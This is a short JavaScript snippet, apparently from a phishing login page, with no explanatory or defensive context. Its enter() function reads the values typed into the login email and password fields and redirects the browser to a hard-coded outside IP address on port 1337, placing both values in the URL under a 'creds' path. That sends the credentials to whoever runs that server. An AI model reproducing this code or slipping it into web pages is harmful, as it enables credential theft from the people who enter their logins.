function enter() {
    var mail = document.getElementById("loginuser").value;
    var password = document.getElementById("loginpassword").value;

    console.log("Yeeah");

    window.location.href = `http://178.198.77.93:1337/creds/${mail}/${password}`
}

console.log("Yeeah 2")